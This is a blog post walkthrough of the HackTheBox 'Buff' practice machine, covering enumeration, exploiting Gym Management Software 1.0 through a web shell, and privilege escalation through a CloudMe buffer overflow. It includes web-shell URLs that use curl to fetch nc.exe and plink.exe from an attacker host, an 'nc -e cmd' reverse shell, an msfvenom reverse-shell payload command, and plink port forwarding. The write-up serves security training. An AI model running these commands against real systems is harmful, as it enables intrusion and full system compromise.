<!DOCTYPE html>
<html lang="en">
<head>
  
    <title>Buff :: dim1119&#39;s Blog</title>
  
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta name="description" content="Windows - Easy Machine" />
<meta name="keywords" content="" />
<meta name="robots" content="noodp" />
<link rel="canonical" href="/hackthebox/buff/" />




<link rel="stylesheet" href="/assets/style.css">






<link rel="apple-touch-icon" href="/img/apple-touch-icon-192x192.png">

  <link rel="shortcut icon" href="/img/favicon/orange.png">



<meta name="twitter:card" content="summary" />

  
    <meta name="twitter:site" content="" />
  
    <meta name="twitter:creator" content="" />



<meta property="og:locale" content="en" />
<meta property="og:type" content="article" />
<meta property="og:title" content="Buff">
<meta property="og:description" content="Windows - Easy Machine" />
<meta property="og:url" content="/hackthebox/buff/" />
<meta property="og:site_name" content="dim1119&#39;s Blog" />

  
    <meta property="og:image" content="/img/favicon/orange.png">
  

<meta property="og:image:width" content="2048">
<meta property="og:image:height" content="1024">


  <meta property="article:published_time" content="2021-04-07 22:43:34 &#43;0300 EEST" />












</head>
<body class="orange">


<div class="container center headings--one-size">

  <header class="header">
  <div class="header__inner">
    <div class="header__logo">
      <a href="/">
  <div class="logo">
    Home
  </div>
</a>

    </div>
    
      <div class="menu-trigger">menu</div>
    
  </div>
  
    <nav class="menu">
  <ul class="menu__inner menu__inner--desktop">
    
      
        
          <li><a href="/about/index.html">About me</a></li>
        
      
        
          <li><a href="/ctf/index.html">CTF</a></li>
        
      
        
          <li><a href="/hackthebox/index.html">HackTheBox</a></li>
        
      
      
    

    
  </ul>

  <ul class="menu__inner menu__inner--mobile">
    
      
        <li><a href="/about/index.html">About me</a></li>
      
    
      
        <li><a href="/ctf/index.html">CTF</a></li>
      
    
      
        <li><a href="/hackthebox/index.html">HackTheBox</a></li>
      
    
    
  </ul>
</nav>

  
</header>


  <div class="content">
    
<div class="post">
  <h1 class="post-title">
    <a href="/hackthebox/buff/">Buff</a></h1>
  <div class="post-meta">
    
      <span class="post-date">
        2021-04-07 
      </span>
    
    
  </div>

  

  

  

  <div class="post-content"><div>
        <p><img src="/htb/fede08f0754a42c98af2a90e5b38d65c.png" alt="810b7fbc93e187a4e5ca25de7c798dfb.png"></p>
<h1 id="enumeration">Enumeration<a href="#enumeration" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
<p>First of all lets nmap scan the machine:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">nmap -Pn 10.129.25.107
Host discovery disabled <span style="color:#f92672">(</span>-Pn<span style="color:#f92672">)</span>. All addresses will be marked <span style="color:#e6db74">&#39;up&#39;</span> and scan times will be slower.
Starting Nmap 7.91 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2020-11-16 16:25 EST
Nmap scan report <span style="color:#66d9ef">for</span> 10.129.25.107
Host is up <span style="color:#f92672">(</span>0.12s latency<span style="color:#f92672">)</span>.
Not shown: <span style="color:#ae81ff">999</span> filtered ports
PORT     STATE SERVICE
8080/tcp open  http-proxy
</code></pre></div><p>If we visit the contact section of the webpage, we can see it is using Gym Management Software 1.0.
There is an <a href="https://www.exploit-db.com/exploits/48506">exploit for that</a>.</p>
<h1 id="εxploiting-the-gym-management-software">Εxploiting the Gym Management Software<a href="#εxploiting-the-gym-management-software" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
<p><img src="/htb/e3eb99e7d2c4458b9fc82610a464e452.png" alt="8f7266e8231ce2d1009edb644f852913.png"></p>
<p>We get a shell, but it is not working well, so lets upload netcat and get a reverse shell.
We can hit this address in the browser:
<code>http://10.129.25.107:8080/upload/kamehameha.php?telepathy=curl%20-O%2010.10.14.149:8083/nc.exe</code></p>
<p>And to spawn the shell:
<code>http://10.129.25.107:8080/upload/kamehameha.php?telepathy=nc -e cmd 10.10.14.149 4467</code></p>
<p>In Desktop we can find the user flag.
<img src="/htb/e6a39a72845b4c598c82868785cd0ef7.png" alt="2783cd40a7cceb5fa2d18f2abef2894f.png"></p>
<h1 id="privilege-escalation">Privilege Escalation<a href="#privilege-escalation" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
<p>So now we need to enumerate. If we check the Downloads of Shaun we see a suspicious setup exe:
<img src="/htb/bfa6b914e6d54c2faaa8d3960f74095a.png" alt="c9b32248067a55a68bb3b4de37183fa4.png"></p>
<p>An <a href="https://www.exploit-db.com/exploits/48389">exploit</a> exists for cloudme .</p>
<p>The exploit is local, so in order to run it we need to port forward the port running on the machine to our pc. Then our machine could connect to port 8888. To do that we can use a utility called plink. Lets upload that using a python web server:
<code>http://10.129.25.107:8080/upload/kamehameha.php?telepathy=curl%20-O%2010.10.14.149:8083/plink.exe</code></p>
<h4 id="payload-creation-and-exploit-finalization">Payload creation and exploit finalization<a href="#payload-creation-and-exploit-finalization" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h4>
<p>Lets create a payload and generate shellcode:
<code>msfvenom -p windows/exec CMD='C:\xampp\htdocs\gym\upload nc.exe 10.10.14.149 5555 -e cmd.exe' -b '\x00\x0A\x0D' -f python</code></p>
<p>and place it into the exploit:
<img src="/htb/a90bee855fb54dfc9b67534e4bc42d31.png" alt="bbfde31bd056b49f2336c667f9309c20.png"></p>
<h4 id="exploiting-the-machine">Exploiting the machine<a href="#exploiting-the-machine" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h4>
<p>Now it is exploit time. Open a listener on your machine using:
<code>nc -nlvp 5555</code></p>
<p>I couldn&rsquo;t get port 22 to work on my machine, so try changing the SSH port in <code>/etc/ssh/ssh_config</code> (I used port 88) and enable the service: <code>service ssh start</code>.</p>
<h4 id="port-forwarding">Port Forwarding<a href="#port-forwarding" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h4>
<p>On the cmd shell initialize the port forwarding:
<code>plink.exe -l &lt;your_username&gt; -pw &lt;your_password&gt; 10.10.14.149 -R 8888:127.0.0.1:8888 -P 88</code>.</p>
<p>It should connect right away. Then run the python exploit and congrats you have root access !</p>
<p><img src="/htb/31eee7c498864ec5877305c4dec950d9.png" alt="dd134e9cc25bd874fd8731506b2273db.png"></p>
<p>After finishing the machine don&rsquo;t forget to change the port back to normal and close the SSH server.</p>

      </div></div>

  

  

</div>

  </div>

  
    <footer class="footer">
  <div class="footer__inner">
    
      <div class="copyright">
        <span>© 2021 Powered by <a href="http://gohugo.io">Hugo</a></span>
    
        <span>:: Theme made by <a href="https://twitter.com/panr">panr</a></span>
      </div>
  </div>
</footer>

<script src="/assets/main.js"></script>
<script src="/assets/prism.js"></script>







  
</div>

</body>
</html>
